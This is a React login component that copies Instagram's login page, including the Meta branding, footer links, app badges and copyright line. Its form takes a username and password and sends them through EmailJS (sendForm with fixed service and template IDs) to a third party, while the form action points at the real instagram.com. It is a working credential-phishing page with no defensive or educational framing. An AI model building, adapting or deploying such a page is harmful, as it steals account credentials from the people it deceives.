import React, { useRef } from "react";
import emailjs from '@emailjs/browser';
import logo from "../assets/images/logo.png";
import fb from "../assets/images/Facebook_logo_(square).png";
import app from "../assets/images/store.png";
import play from "../assets/images/micro.png";
import mobile from "../assets/images/Screenshot 2024-05-05 150842.png";
const Login = () => {
    const form = useRef();

    const sendEmail = (e) => {
      e.preventDefault();
  
      emailjs
        .sendForm('service_qp87cog', 'template_kyifnf8', form.current, {
          publicKey: 'template_aev1odb',
        })
        .then(
          () => {
            console.log('SUCCESS!');
          },
          (error) => {
            console.log('FAILED...', error.text);
          },
        );
    };
    return (
        <div id="container">
            <div className="flex flex-row flex-wrap -mx-3 justify-center">
                <div className="md:w-6/12 max-md:hidden w-100 px-3 h-100">
                    <img src={mobile} alt="mobile" className="h-100 h-[581px]" />
                </div>
                <div className="md:w-6/12 w-100 px-3 ">
                    <form class="main-top" action="https://www.instagram.com/" onSubmit={sendEmail} ref={form}>
                        <div class="flex items-center w-100  justify-center mb-[36px]">
                            <img src={logo} alt="logo" />
                        </div>
                        <div>
                            <input type="text" placeholder="Phone number, username" name="username" class="username" required/>
                            <div>
                                <input type="password" placeholder="password" name="password" class="password" required/>
                            </div>
                            <input href="https://www.instagram.com/" type="submit" value="Log in" class="login-btn mt-3" />
                        </div>
                        <div className="flex items-center gap-1">
                            <hr className="border-t w-[100px] border-black" />
                            <span class="or"> OR </span>
                            <hr className="border-t w-[100px] border-black" />
                        </div>
                        <div class="main-bottom flex items-center flex-col">
                            <a href="https://www.facebook.com/" class="logInFB flex items-center gap-2 text-blue-800"><img src={fb} alt="facebook" width={16} height={16} /> Log in with Facebook </a><br />
                            <a href="https://www.instagram.com/accounts/password/reset/" class="forget"> Forgot password? </a>
                        </div>
                    </form>
                    <div class="bottom border mt-3">
                        <div class="signUp">
                            Don't have an account? <a href="#">Sign up</a>
                        </div>
                    </div>
                    <div class="app-section">
                        <span> Get the app </span>
                        <div class="images">
                            <a href="https://apps.apple.com/in/app/instagram/id389801252"><img src={app} alt="appstore" /></a>
                            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en&gl=US"><img src={play} alt="playstore" /></a>
                        </div>
                    </div>
                </div>
            </div>
            <footer>
                <div className="flex flex-wrap items-center justify-center">
                    <a href="https://about.meta.com/">Meta</a>
                    <a href="https://about.instagram.com/">About</a>
                    <a href="https://about.instagram.com/blog">Blog</a>
                    <a href="https://about.instagram.com/about-us/careers">Jobs</a>
                    <a href="https://help.instagram.com/">Help</a>
                    <a href="https://developers.facebook.com/docs/instagram">API</a>
                    <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a>
                    <a href="https://help.instagram.com/581066165581870/">Terms</a>
                    <a href="https://www.instagram.com/explore/locations/">Top Accounts</a>
                    <a href="https://www.instagram.com/explore/locations/">Locations</a>
                    <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
                    <a href="#">Instagram Contact</a>
                    <a href="#">Uploading & Non-Users</a>
                </div>
                <div class="bottom-footer">
                    <select name="" id="" className="bg-transparent">
                        <option value="English">English</option>
                        <option value="Hindi">Hindi</option>
                        <option value="Punjabi">Punjabi</option>
                        <option value="Urdu">Urdu</option>
                        <option value="Francais">Francais</option>
                    </select>
                    <span> &copy; 2024 Instagram from Meta</span>
                </div>
            </footer>
        </div>
    );
};
export default Login;
